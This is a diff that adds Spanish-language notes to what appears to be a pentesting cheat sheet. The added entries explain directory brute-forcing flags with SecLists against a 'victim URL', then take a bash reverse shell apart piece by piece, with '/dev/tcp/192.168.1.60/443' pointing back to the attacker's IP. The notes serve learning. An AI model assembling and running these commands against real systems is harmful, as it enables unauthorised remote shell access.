@@ -33,3 +33,32 @@
     
 **12. “-oN”**
   -	Es para exportarlo en formato Nmap por si después tenemos que volver a analizarlo.
+
+**13.	“-u”**
+  -	Es para indicarle el url victima
+  	
+**14.	“-w”**
+  -	Es para indicarle el diccionario para la fuerza bruta, en este caso utilizo un que ya esta creado llamado “SecLists” que es un conjunto de diccionarios para hacer fuerza tanto como subdominios, fuzzing, etc.
+    
+**15. “-t”**
+  - Es para indicarle los hilos de el proceso (Cuantas tareas a la vez debe ejecutar a la vez (en este caso 400)
+
+**16. “-x”**
+  - Es para indicarle que extensiones específicas quiero que me reporte que ha encontrado en algún directorio.
+    
+**17.	“bash -c”**
+  -	Primero lo que hacemos es asegurarnos que el comando se ejecuta con bash y no con otro tipo de Shell, ya que sinó no funcionará.
+
+**18.	“bash -i”**
+  -	Ejecutamos una bash interactiva, ya que bash -c solo nos permite ejecutar comandos, como por ejemplo: “whoami”, pero este no nos permite ejecutar nada más, por esa razón una bash interactiva nos deja poner comandos todas las veces que queramos y recibir el output.
+    
+**19.	“>&”**
+  -	Con estos caracteres especiales redirigimos el stdrr y el stdout a nuestro equipo
+    -	“/dev/tcp/192.168.1.60 /443”
+  - En este caso “/dev/tcp” está siendo utilizado para entablar por tcp una conexión con nuestra ip por el puerto 443
+    
+**20.	“0>&1”**
+  -	Redirige el stdin a stdout, esto se hace para que se pueda interactuar con una Shell en remoto mediante la conexión establecida.
+  -	Esta redirección es utilizada para hacer que la entrada estándar del proceso Bash (que normalmente se recibiría del teclado) esté conectada a la misma ubicación que la salida estándar. Esto significa que cualquier entrada que se escriba en la sesión de la shell se transmitirá a través de la misma conexión que se ha establecido con la dirección IP y puerto especificados. Esto permite la interacción bidireccional con la shell remota a través de la conexión de red establecida.
+
+ 
